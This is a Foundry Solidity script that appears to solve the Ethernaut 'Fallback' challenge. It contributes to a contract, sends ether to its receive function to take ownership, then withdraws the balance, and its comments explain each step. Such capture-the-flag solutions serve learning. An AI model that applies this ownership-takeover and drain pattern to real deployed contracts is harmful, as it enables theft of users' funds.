// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import '../src/Fallback.sol';

contract FallbackScript is Script {
   
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // get the instance of the contract
        Fallback instance = Fallback(payable(0x8319FAe80834a20226CC33024540a544a1ce79dD));

        // call the contribute function with 0.0001 ether to set the contributions[msg.sender] != 0
        instance.contribute{value: 0.0001 ether}();

        // call the receive fallback function with 0.0001 ether to set the owner to msg.sender, this is done by simply sending ether to the contract

        address(instance).call{value: 0.0001 ether}("");

        // call the withdraw function to transfer the balance to the owner
        instance.withdraw();

        vm.stopBroadcast();
    }

}
